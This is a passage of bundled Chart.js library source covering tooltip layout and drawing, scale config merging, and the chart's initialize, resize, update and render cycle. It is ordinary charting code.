      x -= radiusAndPadding;
    } else if (xAlign === "right") {
      x += radiusAndPadding;
    }

    return {
      x: x,
      y: y,
    };
  }

  function getAlignedX(vm, align) {
    return align === "center"
      ? vm.x + vm.width / 2
      : align === "right"
      ? vm.x + vm.width - vm.xPadding
      : vm.x + vm.xPadding;
  }

  /**
   * Helper to build before and after body lines
   */
  function getBeforeAfterBodyLines(callback) {
    return pushOrConcat([], splitNewlines(callback));
  }

  var exports$4 = core_element.extend({
    initialize: function () {
      this._model = getBaseModel(this._options);
      this._lastActive = [];
    },

    // Get the title
    // Args are: (tooltipItem, data)
    getTitle: function () {
      var me = this;
      var opts = me._options;
      var callbacks = opts.callbacks;

      var beforeTitle = callbacks.beforeTitle.apply(me, arguments);
      var title = callbacks.title.apply(me, arguments);
      var afterTitle = callbacks.afterTitle.apply(me, arguments);

      var lines = [];
      lines = pushOrConcat(lines, splitNewlines(beforeTitle));
      lines = pushOrConcat(lines, splitNewlines(title));
      lines = pushOrConcat(lines, splitNewlines(afterTitle));

      return lines;
    },

    // Args are: (tooltipItem, data)
    getBeforeBody: function () {
      return getBeforeAfterBodyLines(
        this._options.callbacks.beforeBody.apply(this, arguments)
      );
    },

    // Args are: (tooltipItem, data)
    getBody: function (tooltipItems, data) {
      var me = this;
      var callbacks = me._options.callbacks;
      var bodyItems = [];

      helpers$1.each(tooltipItems, function (tooltipItem) {
        var bodyItem = {
          before: [],
          lines: [],
          after: [],
        };
        pushOrConcat(
          bodyItem.before,
          splitNewlines(callbacks.beforeLabel.call(me, tooltipItem, data))
        );
        pushOrConcat(
          bodyItem.lines,
          callbacks.label.call(me, tooltipItem, data)
        );
        pushOrConcat(
          bodyItem.after,
          splitNewlines(callbacks.afterLabel.call(me, tooltipItem, data))
        );

        bodyItems.push(bodyItem);
      });

      return bodyItems;
    },

    // Args are: (tooltipItem, data)
    getAfterBody: function () {
      return getBeforeAfterBodyLines(
        this._options.callbacks.afterBody.apply(this, arguments)
      );
    },

    // Get the footer and beforeFooter and afterFooter lines
    // Args are: (tooltipItem, data)
    getFooter: function () {
      var me = this;
      var callbacks = me._options.callbacks;

      var beforeFooter = callbacks.beforeFooter.apply(me, arguments);
      var footer = callbacks.footer.apply(me, arguments);
      var afterFooter = callbacks.afterFooter.apply(me, arguments);

      var lines = [];
      lines = pushOrConcat(lines, splitNewlines(beforeFooter));
      lines = pushOrConcat(lines, splitNewlines(footer));
      lines = pushOrConcat(lines, splitNewlines(afterFooter));

      return lines;
    },

    update: function (changed) {
      var me = this;
      var opts = me._options;

      // Need to regenerate the model because its faster than using extend and it is necessary due to the optimization in Chart.Element.transition
      // that does _view = _model if ease === 1. This causes the 2nd tooltip update to set properties in both the view and model at the same time
      // which breaks any animations.
      var existingModel = me._model;
      var model = (me._model = getBaseModel(opts));
      var active = me._active;

      var data = me._data;

      // In the case where active.length === 0 we need to keep these at existing values for good animations
      var alignment = {
        xAlign: existingModel.xAlign,
        yAlign: existingModel.yAlign,
      };
      var backgroundPoint = {
        x: existingModel.x,
        y: existingModel.y,
      };
      var tooltipSize = {
        width: existingModel.width,
        height: existingModel.height,
      };
      var tooltipPosition = {
        x: existingModel.caretX,
        y: existingModel.caretY,
      };

      var i, len;

      if (active.length) {
        model.opacity = 1;

        var labelColors = [];
        var labelTextColors = [];
        tooltipPosition = positioners[opts.position].call(
          me,
          active,
          me._eventPosition
        );

        var tooltipItems = [];
        for (i = 0, len = active.length; i < len; ++i) {
          tooltipItems.push(createTooltipItem(active[i]));
        }

        // If the user provided a filter function, use it to modify the tooltip items
        if (opts.filter) {
          tooltipItems = tooltipItems.filter(function (a) {
            return opts.filter(a, data);
          });
        }

        // If the user provided a sorting function, use it to modify the tooltip items
        if (opts.itemSort) {
          tooltipItems = tooltipItems.sort(function (a, b) {
            return opts.itemSort(a, b, data);
          });
        }

        // Determine colors for boxes
        helpers$1.each(tooltipItems, function (tooltipItem) {
          labelColors.push(
            opts.callbacks.labelColor.call(me, tooltipItem, me._chart)
          );
          labelTextColors.push(
            opts.callbacks.labelTextColor.call(me, tooltipItem, me._chart)
          );
        });

        // Build the Text Lines
        model.title = me.getTitle(tooltipItems, data);
        model.beforeBody = me.getBeforeBody(tooltipItems, data);
        model.body = me.getBody(tooltipItems, data);
        model.afterBody = me.getAfterBody(tooltipItems, data);
        model.footer = me.getFooter(tooltipItems, data);

        // Initial positioning and colors
        model.x = tooltipPosition.x;
        model.y = tooltipPosition.y;
        model.caretPadding = opts.caretPadding;
        model.labelColors = labelColors;
        model.labelTextColors = labelTextColors;

        // data points
        model.dataPoints = tooltipItems;

        // We need to determine alignment of the tooltip
        tooltipSize = getTooltipSize(this, model);
        alignment = determineAlignment(this, tooltipSize);
        // Final Size and Position
        backgroundPoint = getBackgroundPoint(
          model,
          tooltipSize,
          alignment,
          me._chart
        );
      } else {
        model.opacity = 0;
      }

      model.xAlign = alignment.xAlign;
      model.yAlign = alignment.yAlign;
      model.x = backgroundPoint.x;
      model.y = backgroundPoint.y;
      model.width = tooltipSize.width;
      model.height = tooltipSize.height;

      // Point where the caret on the tooltip points to
      model.caretX = tooltipPosition.x;
      model.caretY = tooltipPosition.y;

      me._model = model;

      if (changed && opts.custom) {
        opts.custom.call(me, model);
      }

      return me;
    },

    drawCaret: function (tooltipPoint, size) {
      var ctx = this._chart.ctx;
      var vm = this._view;
      var caretPosition = this.getCaretPosition(tooltipPoint, size, vm);

      ctx.lineTo(caretPosition.x1, caretPosition.y1);
      ctx.lineTo(caretPosition.x2, caretPosition.y2);
      ctx.lineTo(caretPosition.x3, caretPosition.y3);
    },
    getCaretPosition: function (tooltipPoint, size, vm) {
      var x1, x2, x3, y1, y2, y3;
      var caretSize = vm.caretSize;
      var cornerRadius = vm.cornerRadius;
      var xAlign = vm.xAlign;
      var yAlign = vm.yAlign;
      var ptX = tooltipPoint.x;
      var ptY = tooltipPoint.y;
      var width = size.width;
      var height = size.height;

      if (yAlign === "center") {
        y2 = ptY + height / 2;

        if (xAlign === "left") {
          x1 = ptX;
          x2 = x1 - caretSize;
          x3 = x1;

          y1 = y2 + caretSize;
          y3 = y2 - caretSize;
        } else {
          x1 = ptX + width;
          x2 = x1 + caretSize;
          x3 = x1;

          y1 = y2 - caretSize;
          y3 = y2 + caretSize;
        }
      } else {
        if (xAlign === "left") {
          x2 = ptX + cornerRadius + caretSize;
          x1 = x2 - caretSize;
          x3 = x2 + caretSize;
        } else if (xAlign === "right") {
          x2 = ptX + width - cornerRadius - caretSize;
          x1 = x2 - caretSize;
          x3 = x2 + caretSize;
        } else {
          x2 = vm.caretX;
          x1 = x2 - caretSize;
          x3 = x2 + caretSize;
        }
        if (yAlign === "top") {
          y1 = ptY;
          y2 = y1 - caretSize;
          y3 = y1;
        } else {
          y1 = ptY + height;
          y2 = y1 + caretSize;
          y3 = y1;
          // invert drawing order
          var tmp = x3;
          x3 = x1;
          x1 = tmp;
        }
      }
      return { x1: x1, x2: x2, x3: x3, y1: y1, y2: y2, y3: y3 };
    },

    drawTitle: function (pt, vm, ctx) {
      var title = vm.title;
      var length = title.length;
      var titleFontSize, titleSpacing, i;

      if (length) {
        var rtlHelper = getRtlHelper(vm.rtl, vm.x, vm.width);

        pt.x = getAlignedX(vm, vm._titleAlign);

        ctx.textAlign = rtlHelper.textAlign(vm._titleAlign);
        ctx.textBaseline = "middle";

        titleFontSize = vm.titleFontSize;
        titleSpacing = vm.titleSpacing;

        ctx.fillStyle = vm.titleFontColor;
        ctx.font = helpers$1.fontString(
          titleFontSize,
          vm._titleFontStyle,
          vm._titleFontFamily
        );

        for (i = 0; i < length; ++i) {
          ctx.fillText(title[i], rtlHelper.x(pt.x), pt.y + titleFontSize / 2);
          pt.y += titleFontSize + titleSpacing; // Line Height and spacing

          if (i + 1 === length) {
            pt.y += vm.titleMarginBottom - titleSpacing; // If Last, add margin, remove spacing
          }
        }
      }
    },

    drawBody: function (pt, vm, ctx) {
      var bodyFontSize = vm.bodyFontSize;
      var bodySpacing = vm.bodySpacing;
      var bodyAlign = vm._bodyAlign;
      var body = vm.body;
      var drawColorBoxes = vm.displayColors;
      var xLinePadding = 0;
      var colorX = drawColorBoxes ? getAlignedX(vm, "left") : 0;

      var rtlHelper = getRtlHelper(vm.rtl, vm.x, vm.width);

      var fillLineOfText = function (line) {
        ctx.fillText(
          line,
          rtlHelper.x(pt.x + xLinePadding),
          pt.y + bodyFontSize / 2
        );
        pt.y += bodyFontSize + bodySpacing;
      };

      var bodyItem, textColor, labelColors, lines, i, j, ilen, jlen;
      var bodyAlignForCalculation = rtlHelper.textAlign(bodyAlign);

      ctx.textAlign = bodyAlign;
      ctx.textBaseline = "middle";
      ctx.font = helpers$1.fontString(
        bodyFontSize,
        vm._bodyFontStyle,
        vm._bodyFontFamily
      );

      pt.x = getAlignedX(vm, bodyAlignForCalculation);

      // Before body lines
      ctx.fillStyle = vm.bodyFontColor;
      helpers$1.each(vm.beforeBody, fillLineOfText);

      xLinePadding =
        drawColorBoxes && bodyAlignForCalculation !== "right"
          ? bodyAlign === "center"
            ? bodyFontSize / 2 + 1
            : bodyFontSize + 2
          : 0;

      // Draw body lines now
      for (i = 0, ilen = body.length; i < ilen; ++i) {
        bodyItem = body[i];
        textColor = vm.labelTextColors[i];
        labelColors = vm.labelColors[i];

        ctx.fillStyle = textColor;
        helpers$1.each(bodyItem.before, fillLineOfText);

        lines = bodyItem.lines;
        for (j = 0, jlen = lines.length; j < jlen; ++j) {
          // Draw Legend-like boxes if needed
          if (drawColorBoxes) {
            var rtlColorX = rtlHelper.x(colorX);

            // Fill a white rect so that colours merge nicely if the opacity is < 1
            ctx.fillStyle = vm.legendColorBackground;
            ctx.fillRect(
              rtlHelper.leftForLtr(rtlColorX, bodyFontSize),
              pt.y,
              bodyFontSize,
              bodyFontSize
            );

            // Border
            ctx.lineWidth = 1;
            ctx.strokeStyle = labelColors.borderColor;
            ctx.strokeRect(
              rtlHelper.leftForLtr(rtlColorX, bodyFontSize),
              pt.y,
              bodyFontSize,
              bodyFontSize
            );

            // Inner square
            ctx.fillStyle = labelColors.backgroundColor;
            ctx.fillRect(
              rtlHelper.leftForLtr(
                rtlHelper.xPlus(rtlColorX, 1),
                bodyFontSize - 2
              ),
              pt.y + 1,
              bodyFontSize - 2,
              bodyFontSize - 2
            );
            ctx.fillStyle = textColor;
          }

          fillLineOfText(lines[j]);
        }

        helpers$1.each(bodyItem.after, fillLineOfText);
      }

      // Reset back to 0 for after body
      xLinePadding = 0;

      // After body lines
      helpers$1.each(vm.afterBody, fillLineOfText);
      pt.y -= bodySpacing; // Remove last body spacing
    },

    drawFooter: function (pt, vm, ctx) {
      var footer = vm.footer;
      var length = footer.length;
      var footerFontSize, i;

      if (length) {
        var rtlHelper = getRtlHelper(vm.rtl, vm.x, vm.width);

        pt.x = getAlignedX(vm, vm._footerAlign);
        pt.y += vm.footerMarginTop;

        ctx.textAlign = rtlHelper.textAlign(vm._footerAlign);
        ctx.textBaseline = "middle";

        footerFontSize = vm.footerFontSize;

        ctx.fillStyle = vm.footerFontColor;
        ctx.font = helpers$1.fontString(
          footerFontSize,
          vm._footerFontStyle,
          vm._footerFontFamily
        );

        for (i = 0; i < length; ++i) {
          ctx.fillText(footer[i], rtlHelper.x(pt.x), pt.y + footerFontSize / 2);
          pt.y += footerFontSize + vm.footerSpacing;
        }
      }
    },

    drawBackground: function (pt, vm, ctx, tooltipSize) {
      ctx.fillStyle = vm.backgroundColor;
      ctx.strokeStyle = vm.borderColor;
      ctx.lineWidth = vm.borderWidth;
      var xAlign = vm.xAlign;
      var yAlign = vm.yAlign;
      var x = pt.x;
      var y = pt.y;
      var width = tooltipSize.width;
      var height = tooltipSize.height;
      var radius = vm.cornerRadius;

      ctx.beginPath();
      ctx.moveTo(x + radius, y);
      if (yAlign === "top") {
        this.drawCaret(pt, tooltipSize);
      }
      ctx.lineTo(x + width - radius, y);
      ctx.quadraticCurveTo(x + width, y, x + width, y + radius);
      if (yAlign === "center" && xAlign === "right") {
        this.drawCaret(pt, tooltipSize);
      }
      ctx.lineTo(x + width, y + height - radius);
      ctx.quadraticCurveTo(
        x + width,
        y + height,
        x + width - radius,
        y + height
      );
      if (yAlign === "bottom") {
        this.drawCaret(pt, tooltipSize);
      }
      ctx.lineTo(x + radius, y + height);
      ctx.quadraticCurveTo(x, y + height, x, y + height - radius);
      if (yAlign === "center" && xAlign === "left") {
        this.drawCaret(pt, tooltipSize);
      }
      ctx.lineTo(x, y + radius);
      ctx.quadraticCurveTo(x, y, x + radius, y);
      ctx.closePath();

      ctx.fill();

      if (vm.borderWidth > 0) {
        ctx.stroke();
      }
    },

    draw: function () {
      var ctx = this._chart.ctx;
      var vm = this._view;

      if (vm.opacity === 0) {
        return;
      }

      var tooltipSize = {
        width: vm.width,
        height: vm.height,
      };
      var pt = {
        x: vm.x,
        y: vm.y,
      };

      // IE11/Edge does not like very small opacities, so snap to 0
      var opacity = Math.abs(vm.opacity < 1e-3) ? 0 : vm.opacity;

      // Truthy/falsey value for empty tooltip
      var hasTooltipContent =
        vm.title.length ||
        vm.beforeBody.length ||
        vm.body.length ||
        vm.afterBody.length ||
        vm.footer.length;

      if (this._options.enabled && hasTooltipContent) {
        ctx.save();
        ctx.globalAlpha = opacity;

        // Draw Background
        this.drawBackground(pt, vm, ctx, tooltipSize);

        // Draw Title, Body, and Footer
        pt.y += vm.yPadding;

        helpers$1.rtl.overrideTextDirection(ctx, vm.textDirection);

        // Titles
        this.drawTitle(pt, vm, ctx);

        // Body
        this.drawBody(pt, vm, ctx);

        // Footer
        this.drawFooter(pt, vm, ctx);

        helpers$1.rtl.restoreTextDirection(ctx, vm.textDirection);

        ctx.restore();
      }
    },

    /**
     * Handle an event
     * @private
     * @param {IEvent} event - The event to handle
     * @returns {boolean} true if the tooltip changed
     */
    handleEvent: function (e) {
      var me = this;
      var options = me._options;
      var changed = false;

      me._lastActive = me._lastActive || [];

      // Find Active Elements for tooltips
      if (e.type === "mouseout") {
        me._active = [];
      } else {
        me._active = me._chart.getElementsAtEventForMode(
          e,
          options.mode,
          options
        );
        if (options.reverse) {
          me._active.reverse();
        }
      }

      // Remember Last Actives
      changed = !helpers$1.arrayEquals(me._active, me._lastActive);

      // Only handle target event on tooltip change
      if (changed) {
        me._lastActive = me._active;

        if (options.enabled || options.custom) {
          me._eventPosition = {
            x: e.x,
            y: e.y,
          };

          me.update(true);
          me.pivot();
        }
      }

      return changed;
    },
  });

  /**
   * @namespace Chart.Tooltip.positioners
   */
  var positioners_1 = positioners;

  var core_tooltip = exports$4;
  core_tooltip.positioners = positioners_1;

  var valueOrDefault$9 = helpers$1.valueOrDefault;

  core_defaults._set("global", {
    elements: {},
    events: ["mousemove", "mouseout", "click", "touchstart", "touchmove"],
    hover: {
      onHover: null,
      mode: "nearest",
      intersect: true,
      animationDuration: 400,
    },
    onClick: null,
    maintainAspectRatio: true,
    responsive: true,
    responsiveAnimationDuration: 0,
  });

  /**
   * Recursively merge the given config objects representing the `scales` option
   * by incorporating scale defaults in `xAxes` and `yAxes` array items, then
   * returns a deep copy of the result, thus doesn't alter inputs.
   */
  function mergeScaleConfig(/* config objects ... */) {
    return helpers$1.merge(Object.create(null), [].slice.call(arguments), {
      merger: function (key, target, source, options) {
        if (key === "xAxes" || key === "yAxes") {
          var slen = source[key].length;
          var i, type, scale;

          if (!target[key]) {
            target[key] = [];
          }

          for (i = 0; i < slen; ++i) {
            scale = source[key][i];
            type = valueOrDefault$9(
              scale.type,
              key === "xAxes" ? "category" : "linear"
            );

            if (i >= target[key].length) {
              target[key].push({});
            }

            if (
              !target[key][i].type ||
              (scale.type && scale.type !== target[key][i].type)
            ) {
              // new/untyped scale or type changed: let's apply the new defaults
              // then merge source scale to correctly overwrite the defaults.
              helpers$1.merge(target[key][i], [
                core_scaleService.getScaleDefaults(type),
                scale,
              ]);
            } else {
              // scales type are the same
              helpers$1.merge(target[key][i], scale);
            }
          }
        } else {
          helpers$1._merger(key, target, source, options);
        }
      },
    });
  }

  /**
   * Recursively merge the given config objects as the root options by handling
   * default scale options for the `scales` and `scale` properties, then returns
   * a deep copy of the result, thus doesn't alter inputs.
   */
  function mergeConfig(/* config objects ... */) {
    return helpers$1.merge(Object.create(null), [].slice.call(arguments), {
      merger: function (key, target, source, options) {
        var tval = target[key] || Object.create(null);
        var sval = source[key];

        if (key === "scales") {
          // scale config merging is complex. Add our own function here for that
          target[key] = mergeScaleConfig(tval, sval);
        } else if (key === "scale") {
          // used in polar area & radar charts since there is only one scale
          target[key] = helpers$1.merge(tval, [
            core_scaleService.getScaleDefaults(sval.type),
            sval,
          ]);
        } else {
          helpers$1._merger(key, target, source, options);
        }
      },
    });
  }

  function initConfig(config) {
    config = config || Object.create(null);

    // Do NOT use mergeConfig for the data object because this method merges arrays
    // and so would change references to labels and datasets, preventing data updates.
    var data = (config.data = config.data || {});
    data.datasets = data.datasets || [];
    data.labels = data.labels || [];

    config.options = mergeConfig(
      core_defaults.global,
      core_defaults[config.type],
      config.options || {}
    );

    return config;
  }

  function updateConfig(chart) {
    var newOptions = chart.options;

    helpers$1.each(chart.scales, function (scale) {
      core_layouts.removeBox(chart, scale);
    });

    newOptions = mergeConfig(
      core_defaults.global,
      core_defaults[chart.config.type],
      newOptions
    );

    chart.options = chart.config.options = newOptions;
    chart.ensureScalesHaveIDs();
    chart.buildOrUpdateScales();

    // Tooltip
    chart.tooltip._options = newOptions.tooltips;
    chart.tooltip.initialize();
  }

  function nextAvailableScaleId(axesOpts, prefix, index) {
    var id;
    var hasId = function (obj) {
      return obj.id === id;
    };

    do {
      id = prefix + index++;
    } while (helpers$1.findIndex(axesOpts, hasId) >= 0);

    return id;
  }

  function positionIsHorizontal(position) {
    return position === "top" || position === "bottom";
  }

  function compare2Level(l1, l2) {
    return function (a, b) {
      return a[l1] === b[l1] ? a[l2] - b[l2] : a[l1] - b[l1];
    };
  }

  var Chart = function (item, config) {
    this.construct(item, config);
    return this;
  };

  helpers$1.extend(
    Chart.prototype,
    /** @lends Chart */ {
      /**
       * @private
       */
      construct: function (item, config) {
        var me = this;

        config = initConfig(config);

        var context = platform.acquireContext(item, config);
        var canvas = context && context.canvas;
        var height = canvas && canvas.height;
        var width = canvas && canvas.width;

        me.id = helpers$1.uid();
        me.ctx = context;
        me.canvas = canvas;
        me.config = config;
        me.width = width;
        me.height = height;
        me.aspectRatio = height ? width / height : null;
        me.options = config.options;
        me._bufferedRender = false;
        me._layers = [];

        /**
         * Provided for backward compatibility, Chart and Chart.Controller have been merged,
         * the "instance" still need to be defined since it might be called from plugins.
         * @prop Chart#chart
         * @deprecated since version 2.6.0
         * @todo remove at version 3
         * @private
         */
        me.chart = me;
        me.controller = me; // chart.chart.controller #inception

        // Add the chart instance to the global namespace
        Chart.instances[me.id] = me;

        // Define alias to the config data: `chart.data === chart.config.data`
        Object.defineProperty(me, "data", {
          get: function () {
            return me.config.data;
          },
          set: function (value) {
            me.config.data = value;
          },
        });

        if (!context || !canvas) {
          // The given item is not a compatible context2d element, let's return before finalizing
          // the chart initialization but after setting basic chart / controller properties that
          // can help to figure out that the chart is not valid (e.g chart.canvas !== null);
          // https://github.com/chartjs/Chart.js/issues/2807
          console.error(
            "Failed to create chart: can't acquire context from the given item"
          );
          return;
        }

        me.initialize();
        me.update();
      },

      /**
       * @private
       */
      initialize: function () {
        var me = this;

        // Before init plugin notification
        core_plugins.notify(me, "beforeInit");

        helpers$1.retinaScale(me, me.options.devicePixelRatio);

        me.bindEvents();

        if (me.options.responsive) {
          // Initial resize before chart draws (must be silent to preserve initial animations).
          me.resize(true);
        }

        me.initToolTip();

        // After init plugin notification
        core_plugins.notify(me, "afterInit");

        return me;
      },

      clear: function () {
        helpers$1.canvas.clear(this);
        return this;
      },

      stop: function () {
        // Stops any current animation loop occurring
        core_animations.cancelAnimation(this);
        return this;
      },

      resize: function (silent) {
        var me = this;
        var options = me.options;
        var canvas = me.canvas;
        var aspectRatio =
          (options.maintainAspectRatio && me.aspectRatio) || null;

        // the canvas render width and height will be casted to integers so make sure that
        // the canvas display style uses the same integer values to avoid blurring effect.

        // Set to 0 instead of canvas.size because the size defaults to 300x150 if the element is collapsed
        var newWidth = Math.max(
          0,
          Math.floor(helpers$1.getMaximumWidth(canvas))
        );
        var newHeight = Math.max(
          0,
          Math.floor(
            aspectRatio
              ? newWidth / aspectRatio
              : helpers$1.getMaximumHeight(canvas)
          )
        );

        if (me.width === newWidth && me.height === newHeight) {
          return;
        }

        canvas.width = me.width = newWidth;
        canvas.height = me.height = newHeight;
        canvas.style.width = newWidth + "px";
        canvas.style.height = newHeight + "px";

        helpers$1.retinaScale(me, options.devicePixelRatio);

        if (!silent) {
          // Notify any plugins about the resize
          var newSize = { width: newWidth, height: newHeight };
          core_plugins.notify(me, "resize", [newSize]);

          // Notify of resize
          if (options.onResize) {
            options.onResize(me, newSize);
          }

          me.stop();
          me.update({
            duration: options.responsiveAnimationDuration,
          });
        }
      },

      ensureScalesHaveIDs: function () {
        var options = this.options;
        var scalesOptions = options.scales || {};
        var scaleOptions = options.scale;

        helpers$1.each(scalesOptions.xAxes, function (xAxisOptions, index) {
          if (!xAxisOptions.id) {
            xAxisOptions.id = nextAvailableScaleId(
              scalesOptions.xAxes,
              "x-axis-",
              index
            );
          }
        });

        helpers$1.each(scalesOptions.yAxes, function (yAxisOptions, index) {
          if (!yAxisOptions.id) {
            yAxisOptions.id = nextAvailableScaleId(
              scalesOptions.yAxes,
              "y-axis-",
              index
            );
          }
        });

        if (scaleOptions) {
          scaleOptions.id = scaleOptions.id || "scale";
        }
      },

      /**
       * Builds a map of scale ID to scale object for future lookup.
       */
      buildOrUpdateScales: function () {
        var me = this;
        var options = me.options;
        var scales = me.scales || {};
        var items = [];
        var updated = Object.keys(scales).reduce(function (obj, id) {
          obj[id] = false;
          return obj;
        }, {});

        if (options.scales) {
          items = items.concat(
            (options.scales.xAxes || []).map(function (xAxisOptions) {
              return {
                options: xAxisOptions,
                dtype: "category",
                dposition: "bottom",
              };
            }),
            (options.scales.yAxes || []).map(function (yAxisOptions) {
              return {
                options: yAxisOptions,
                dtype: "linear",
                dposition: "left",
              };
            })
          );
        }

        if (options.scale) {
          items.push({
            options: options.scale,
            dtype: "radialLinear",
            isDefault: true,
            dposition: "chartArea",
          });
        }

        helpers$1.each(items, function (item) {
          var scaleOptions = item.options;
          var id = scaleOptions.id;
          var scaleType = valueOrDefault$9(scaleOptions.type, item.dtype);

          if (
            positionIsHorizontal(scaleOptions.position) !==
            positionIsHorizontal(item.dposition)
          ) {
            scaleOptions.position = item.dposition;
          }

          updated[id] = true;
          var scale = null;
          if (id in scales && scales[id].type === scaleType) {
            scale = scales[id];
            scale.options = scaleOptions;
            scale.ctx = me.ctx;
            scale.chart = me;
          } else {
            var scaleClass = core_scaleService.getScaleConstructor(scaleType);
            if (!scaleClass) {
              return;
            }
            scale = new scaleClass({
              id: id,
              type: scaleType,
              options: scaleOptions,
              ctx: me.ctx,
              chart: me,
            });
            scales[scale.id] = scale;
          }

          scale.mergeTicksOptions();

          // TODO(SB): I think we should be able to remove this custom case (options.scale)
          // and consider it as a regular scale part of the "scales"" map only! This would
          // make the logic easier and remove some useless? custom code.
          if (item.isDefault) {
            me.scale = scale;
          }
        });
        // clear up discarded scales
        helpers$1.each(updated, function (hasUpdated, id) {
          if (!hasUpdated) {
            delete scales[id];
          }
        });

        me.scales = scales;

        core_scaleService.addScalesToLayout(this);
      },

      buildOrUpdateControllers: function () {
        var me = this;
        var newControllers = [];
        var datasets = me.data.datasets;
        var i, ilen;

        for (i = 0, ilen = datasets.length; i < ilen; i++) {
          var dataset = datasets[i];
          var meta = me.getDatasetMeta(i);
          var type = dataset.type || me.config.type;

          if (meta.type && meta.type !== type) {
            me.destroyDatasetMeta(i);
            meta = me.getDatasetMeta(i);
          }
          meta.type = type;
          meta.order = dataset.order || 0;
          meta.index = i;

          if (meta.controller) {
            meta.controller.updateIndex(i);
            meta.controller.linkScales();
          } else {
            var ControllerClass = controllers[meta.type];
            if (ControllerClass === undefined) {
              throw new Error('"' + meta.type + '" is not a chart type.');
            }

            meta.controller = new ControllerClass(me, i);
            newControllers.push(meta.controller);
          }
        }

        return newControllers;
      },

      /**
       * Reset the elements of all datasets
       * @private
       */
      resetElements: function () {
        var me = this;
        helpers$1.each(
          me.data.datasets,
          function (dataset, datasetIndex) {
            me.getDatasetMeta(datasetIndex).controller.reset();
          },
          me
        );
      },

      /**
       * Resets the chart back to it's state before the initial animation
       */
      reset: function () {
        this.resetElements();
        this.tooltip.initialize();
      },

      update: function (config) {
        var me = this;
        var i, ilen;

        if (!config || typeof config !== "object") {
          // backwards compatibility
          config = {
            duration: config,
            lazy: arguments[1],
          };
        }

        updateConfig(me);

        // plugins options references might have change, let's invalidate the cache
        // https://github.com/chartjs/Chart.js/issues/5111#issuecomment-355934167
        core_plugins._invalidate(me);

        if (core_plugins.notify(me, "beforeUpdate") === false) {
          return;
        }

        // In case the entire data object changed
        me.tooltip._data = me.data;

        // Make sure dataset controllers are updated and new controllers are reset
        var newControllers = me.buildOrUpdateControllers();

        // Make sure all dataset controllers have correct meta data counts
        for (i = 0, ilen = me.data.datasets.length; i < ilen; i++) {
          me.getDatasetMeta(i).controller.buildOrUpdateElements();
        }

        me.updateLayout();

        // Can only reset the new controllers after the scales have been updated
        if (me.options.animation && me.options.animation.duration) {
          helpers$1.each(newControllers, function (controller) {
            controller.reset();
          });
        }

        me.updateDatasets();

        // Need to reset tooltip in case it is displayed with elements that are removed
        // after update.
        me.tooltip.initialize();

        // Last active contains items that were previously in the tooltip.
        // When we reset the tooltip, we need to clear it
        me.lastActive = [];

        // Do this before render so that any plugins that need final scale updates can use it
        core_plugins.notify(me, "afterUpdate");

        me._layers.sort(compare2Level("z", "_idx"));

        if (me._bufferedRender) {
          me._bufferedRequest = {
            duration: config.duration,
            easing: config.easing,
            lazy: config.lazy,
          };
        } else {
          me.render(config);
        }
      },

      /**
       * Updates the chart layout unless a plugin returns `false` to the `beforeLayout`
       * hook, in which case, plugins will not be called on `afterLayout`.
       * @private
       */
      updateLayout: function () {
        var me = this;

        if (core_plugins.notify(me, "beforeLayout") === false) {
          return;
        }

        core_layouts.update(this, this.width, this.height);

        me._layers = [];
        helpers$1.each(
          me.boxes,
          function (box) {
            // _configure is called twice, once in core.scale.update and once here.
            // Here the boxes are fully updated and at their final positions.
            if (box._configure) {
              box._configure();
            }
            me._layers.push.apply(me._layers, box._layers());
          },
          me
        );

        me._layers.forEach(function (item, index) {
          item._idx = index;
        });

        /**
         * Provided for backward compatibility, use `afterLayout` instead.
         * @method IPlugin#afterScaleUpdate
         * @deprecated since version 2.5.0
         * @todo remove at version 3
         * @private
         */
        core_plugins.notify(me, "afterScaleUpdate");
        core_plugins.notify(me, "afterLayout");
      },

      /**
       * Updates all datasets unless a plugin returns `false` to the `beforeDatasetsUpdate`
       * hook, in which case, plugins will not be called on `afterDatasetsUpdate`.
       * @private
       */
      updateDatasets: function () {
        var me = this;

        if (core_plugins.notify(me, "beforeDatasetsUpdate") === false) {
          return;
        }

        for (var i = 0, ilen = me.data.datasets.length; i < ilen; ++i) {
          me.updateDataset(i);
        }

        core_plugins.notify(me, "afterDatasetsUpdate");
      },

      /**
       * Updates dataset at index unless a plugin returns `false` to the `beforeDatasetUpdate`
       * hook, in which case, plugins will not be called on `afterDatasetUpdate`.
       * @private
       */
      updateDataset: function (index) {
        var me = this;
        var meta = me.getDatasetMeta(index);
        var args = {
          meta: meta,
          index: index,
        };

        if (core_plugins.notify(me, "beforeDatasetUpdate", [args]) === false) {
          return;
        }

        meta.controller._update();

        core_plugins.notify(me, "afterDatasetUpdate", [args]);
      },

      render: function (config) {
        var me = this;

        if (!config || typeof config !== "object") {
          // backwards compatibility
          config = {
            duration: config,
            lazy: arguments[1],
          };
        }

        var animationOptions = me.options.animation;
        var duration = valueOrDefault$9(
          config.duration,
          animationOptions && animationOptions.duration
        );
        var lazy = config.lazy;

        if (core_plugins.notify(me, "beforeRender") === false) {
          return;
        }

        var onComplete = function (animation) {
          core_plugins.notify(me, "afterRender");
          helpers$1.callback(
            animationOptions && animationOptions.onComplete,
            [animation],
            me
          );
        };

        if (animationOptions && duration) {
          var animation = new core_animation({
            numSteps: duration / 16.66, // 60 fps
            easing: config.easing || animationOptions.easing,

            render: function (chart, animationObject) {
              var easingFunction =
                helpers$1.easing.effects[animationObject.easing];
              var currentStep = animationObject.currentStep;
              var stepDecimal = currentStep / animationObject.numSteps;

              chart.draw(easingFunction(stepDecimal), stepDecimal, currentStep);
            },

            onAnimationProgress: animationOptions.onProgress,
            onAnimationComplete: onComplete,
          });

          core_animations.addAnimation(me, animation, duration, lazy);
        } else {
          me.draw();

          // See https://github.com/chartjs/Chart.js/issues/3781
          onComplete(new core_animation({ numSteps: 0, chart: me }));
        }

        return me;
      },

      draw: function (easingValue) {
        var me = this;
        var i, layers;

        me.clear();

        if (helpers$1.isNullOrUndef(easingValue)) {
          easingValue = 1;
        }

        me.transition(easingValue);

        if (me.width <= 0 || me.height <= 0) {
          return;
        }

        if (core_plugins.notify(me, "beforeDraw", [easingValue]) === false) {
          return;
        }

        // Because of plugin hooks (before/afterDatasetsDraw), datasets can't
        // currently be part of layers. Instead, we draw
        // layers <= 0 before(default, backward compat), and the rest after
        layers = me._layers;
        for (i = 0; i < layers.length && layers[i].z <= 0; ++i) {
          layers[i].draw(me.chartArea);
        }

        me.drawDatasets(easingValue);

        // Rest of layers
        for (; i < layers.length; ++i) {
          layers[i].draw(me.chartArea);
        }

        me._drawTooltip(easingValue);

        core_plugins.notify(me, "afterDraw", [easingValue]);
      },

      /**
